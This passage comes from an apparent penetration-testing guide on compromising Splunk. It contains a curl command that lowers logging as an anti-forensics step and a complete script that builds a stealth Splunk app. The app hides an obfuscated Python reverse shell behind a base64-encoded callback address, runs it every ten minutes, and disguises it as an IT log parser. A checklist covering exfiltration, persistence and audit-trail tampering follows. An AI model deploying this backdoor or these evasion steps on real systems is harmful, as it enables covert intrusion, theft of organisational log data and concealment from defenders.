    curl -s -b cookies.txt -X POST \
      -d "rootLevel=ERROR" \
      "$splunk_url/services/server/logger"
    
    echo "[+] Anti-forensics measures implemented"
}

# splunk_anti_forensics "http://target.com:8000"
```

---

## Defense Evasion and Operational Security

### Stealth Application Development

#### Low-Profile Application Design
```bash
# Create stealth application with minimal detection footprint
create_stealth_app() {
    local app_name="log_parser"
    
    echo "[+] Creating stealth Splunk application"
    
    mkdir -p stealth_app/$app_name/{bin,default}
    
    # Obfuscated reverse shell
    cat > stealth_app/$app_name/bin/parser.py << 'EOF'
#!/usr/bin/env python3
import socket, subprocess, base64, time
import sys, os

# Obfuscated configuration
config = base64.b64decode("MTAuMTAuMTQuMTU6NDQ0Mw==").decode()  # IP:PORT
host, port = config.split(":")

def process_logs():
    # Legitimate-looking function name
    try:
        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        conn.settimeout(10)
        conn.connect((host, int(port)))
        
        # Send system info
        info = subprocess.check_output("whoami && hostname", shell=True)
        conn.send(b"[LOG_PARSER] " + info)
        
        while True:
            try:
                data = conn.recv(1024)
                if not data or data.decode().strip() == "exit":
                    break
                
                # Execute command
                result = subprocess.check_output(data, shell=True, stderr=subprocess.STDOUT)
                conn.send(result)
                
            except subprocess.CalledProcessError as e:
                conn.send(f"Error: {e}".encode())
            except:
                break
                
        conn.close()
        
    except:
        # Fail silently
        pass

if __name__ == "__main__":
    process_logs()
EOF
    
    # Legitimate-looking inputs.conf
    cat > stealth_app/$app_name/default/inputs.conf << 'EOF'
[script://./bin/parser.py]
disabled = 0
interval = 600
sourcetype = log_analysis
source = log_parser
EOF
    
    # Legitimate application metadata
    cat > stealth_app/$app_name/default/app.conf << 'EOF'
[install]
state = enabled
is_configured = true

[ui]
is_visible = false
label = Log Parser

[launcher]
author = IT Operations
description = Advanced log parsing and analysis
version = 2.1.0
EOF
    
    tar -czf stealth_app.tar.gz stealth_app/
    
    echo "[+] Stealth application created: stealth_app.tar.gz"
    echo "[+] Designed to blend with legitimate Splunk operations"
}

# create_stealth_app
```

---

## Professional Assessment Integration

### Splunk Security Assessment Workflow

#### Discovery Phase
- [ ] **Service Identification** - Port scanning and Splunk service detection
- [ ] **Version Detection** - REST API and web interface analysis
- [ ] **License Assessment** - Free vs Enterprise authentication requirements
- [ ] **Authentication Testing** - Default credentials and bypass techniques

#### Exploitation Phase
- [ ] **Application Deployment** - Malicious Splunk app creation and upload
- [ ] **Scripted Input Abuse** - Python/PowerShell script execution
- [ ] **Universal Forwarder Compromise** - Deployment server exploitation
- [ ] **Data Exfiltration** - Sensitive log data and configuration extraction

#### Post-Exploitation Phase
- [ ] **Persistence Establishment** - Backdoor application installation
- [ ] **Log Manipulation** - Audit trail tampering and anti-forensics
- [ ] **Lateral Movement** - Universal Forwarder network exploitation
- [ ] **Intelligence Gathering** - SIEM data and security monitoring bypass

---

## Next Steps

After Splunk exploitation mastery:
1. **[PRTG Network Monitor Attacks](prtg-attacks.md)** - Infrastructure monitoring exploitation
2. **[SIEM Security Assessment](siem-security.md)** - Advanced log analytics platform attacks
3. **[Nagios/Zabbix Exploitation](nagios-zabbix-attacks.md)** - Network monitoring system compromise

**💡 Key Takeaway:** Splunk exploitation provides **comprehensive access to organizational security data** with **SYSTEM/root privileges** and **lateral movement capabilities**. Master **custom application deployment**, **scripted input abuse**, and **Universal Forwarder compromise** for **complete SIEM infrastructure control** and **sensitive data exfiltration**.

**⚔️ Professional Impact:** Splunk compromises often lead to **complete security monitoring bypass**, **access to all organizational logs**, **compliance violation opportunities**, and **enterprise-wide lateral movement** through **Universal Forwarder networks**, making these skills **critical for advanced penetration testing** in **enterprise SIEM environments**. 